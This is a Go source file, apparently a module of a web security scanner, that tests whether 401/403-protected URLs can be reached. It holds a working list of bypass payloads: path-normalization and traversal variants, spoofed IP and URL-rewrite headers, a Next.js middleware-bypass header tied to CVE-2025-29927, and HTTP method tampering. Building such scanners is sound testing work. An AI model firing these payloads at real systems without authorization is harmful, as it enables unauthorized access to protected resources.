package forbidden_bypass

import (
	"strings"

	"github.com/pkg/errors"
	stringsutil "github.com/projectdiscovery/utils/strings"
	urlutil "github.com/projectdiscovery/utils/url"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

type Module struct {
	modkit.BaseActiveModule
	ds                dedup.Lazy[dedup.DiskSet]
	limitCheckPerHost int
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		ds:                dedup.LazyDiskSet("forbidden_bypass"),
		limitCheckPerHost: 20,
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	statusCode := 0
	if ctx.Response() != nil {
		statusCode = ctx.Response().StatusCode()
	}
	if statusCode != 401 && statusCode != 403 {
		return results, nil
	}
	if !m.markAndShouldContinue(urlx, scanCtx) {
		return results, nil
	}

	pathBypassResults, err := bypassPath(urlx, ctx, httpClient)
	if err == nil && len(pathBypassResults) > 0 {
		results = append(results, pathBypassResults...)
		return results, nil
	}

	headerBypassResults, err := bypassHeaders(urlx, ctx, httpClient)
	if err == nil && len(headerBypassResults) > 0 {
		results = append(results, headerBypassResults...)
		return results, nil
	}

	methodBypassResults, err := bypassMethod(urlx, ctx, httpClient)
	if err == nil && len(methodBypassResults) > 0 {
		results = append(results, methodBypassResults...)
		return results, nil
	}

	return results, nil
}

func bypassPath(urlx *urlutil.URL, ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent
	path := urlx.EscapedPath()
	pathPayloads := []string{
		"/." + path,
		path + "/./",
		"/." + path + "/./",
		path + " /",
		"/ " + path + " /",
		path + "	/",
		"/	" + path + "	/",
		path + "..;/",
		path + "?",
		path + "??",
		"/" + path + "//",
		path + "/",
		path + "/.testus",
		path + "../app.py",
		// Path normalization bypasses
		"//" + path,
		"/%2e" + path,
		path + "%00",
		path + ";",
		"/%2f" + path,
		path + "/%2e%2e/",
		"/." + path + "%20",
		strings.ToUpper(path),
		`\` + path,
		path + `%09`,
	}

	for _, payload := range pathPayloads {
		modifiedRaw, err := httpmsg.SetPath(ctx.Request().Raw(), payload)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if resp.Response().StatusCode == 200 {
			respDump := resp.FullResponse().String()
			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + payload,
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: "path",
				ExtractedResults: []string{payload},
				Info: output.Info{
					Description: "Found 403 Forbidden Bypass using path",
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

func bypassHeaders(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	path := urlx.EscapedPath()
	headerPayloads := map[string]string{
		"x-rewrite-url":             path,
		"x-original-url":            path,
		"referer":                   path,
		"x-custom-ip-authorization": "127.0.0.1",
		"x-originating-ip":          "127.0.0.1",
		"x-forwarded-for":           "127.0.0.1",
		"x-remote-ip":               "127.0.0.1",
		"x-client-ip":               "127.0.0.1",
		"x-host":                    "127.0.0.1",
		"x-forwarded-host":          "127.0.0.1",
		// Next.js middleware bypass (CVE-2025-29927)
		"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
		"x-real-ip":               "127.0.0.1",
		"cf-connecting-ip":        "127.0.0.1",
	}

	for headerKey, headerValue := range headerPayloads {
		var newPath string
		if stringsutil.ContainsAny(headerKey, "x-rewrite-url", "referer") {
			newPath = "/anything"
		} else if strings.Contains(headerKey, "x-original-url") {
			newPath = "/"
		} else {
			newPath = path
		}

		// First set the path, then add the header
		modifiedRaw, err := httpmsg.SetPath(ctx.Request().Raw(), newPath)
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddHeader(modifiedRaw, headerKey, headerValue)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if resp.Response().StatusCode == 200 {
			respDump := resp.FullResponse().String()
			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + newPath,
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: headerKey,
				ExtractedResults: []string{headerValue},
				Info: output.Info{
					Description: "Found 403 Forbidden Bypass using header",
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

// bypassMethods are HTTP methods to test for method tampering bypass.
var bypassMethods = []string{"PUT", "PATCH", "DELETE", "TRACE", "PROPFIND", "CONNECT"}

// methodOverrideHeaders are headers that can override the HTTP method at the server level.
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

func bypassMethod(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	// Phase 1: Try different HTTP methods directly
	for _, method := range bypassMethods {
		modifiedRaw, err := httpmsg.SetMethod(ctx.Request().Raw(), method)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		if resp.Response() != nil && isMethodBypassStatus(method, resp.Response().StatusCode, resp.FullResponse().String()) {
			respDump := resp.FullResponse().String()
			results = append(results, &output.ResultEvent{
				URL:              urlx.String(),
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: "method",
				ExtractedResults: []string{method},
				Info: output.Info{
					Description: "Found 403/401 Bypass using HTTP method " + method,
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	// Phase 2: Try method override headers with POST
	for _, overrideHeader := range methodOverrideHeaders {
		modifiedRaw, err := httpmsg.SetMethod(ctx.Request().Raw(), "POST")
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, overrideHeader, "GET")
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		if resp.Response() != nil && resp.Response().StatusCode == 200 {
			body := resp.FullResponse().String()
			if !strings.Contains(strings.ToLower(body), "method not allowed") {
				results = append(results, &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(modifiedRaw),
					Response:         body,
					FuzzingParameter: overrideHeader,
					ExtractedResults: []string{"POST with " + overrideHeader + ": GET"},
					Info: output.Info{
						Description: "Found 403/401 Bypass using method override header " + overrideHeader,
					},
				})
				resp.Close()
				return results, nil
			}
		}
		resp.Close()
	}

	return results, nil
}

// isMethodBypassStatus checks whether the response indicates a genuine method bypass.
// Filters out common false positives.
func isMethodBypassStatus(method string, statusCode int, body string) bool {
	// 405, 401, 403, 404 are not bypasses
	switch statusCode {
	case 405, 401, 403, 404:
		return false
	}

	// Only consider 2xx as potential bypasses
	if statusCode < 200 || statusCode >= 300 {
		return false
	}

	bodyLower := strings.ToLower(body)

	// HEAD returning 200 is normal behavior, not a bypass
	if method == "HEAD" {
		return false
	}

	// OPTIONS with small body is likely CORS preflight, not a bypass
	if method == "OPTIONS" && len(body) < 500 {
		return false
	}

	// Redirect to login page is not a bypass
	if strings.Contains(bodyLower, "/login") || strings.Contains(bodyLower, "/signin") {
		return false
	}

	// "Method not allowed" in body is not a bypass
	if strings.Contains(bodyLower, "method not allowed") {
		return false
	}

	return true
}

// markAndShouldContinue marks the host as checked and returns true if it should continue
func (m *Module) markAndShouldContinue(urlx *urlutil.URL, scanCtx *modkit.ScanContext) bool {
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	if diskSet == nil {
		return true
	}
	host := urlx.Hostname()
	_, shouldContinue := diskSet.IncrementAndCheck(host, m.limitCheckPerHost)
	return shouldContinue
}
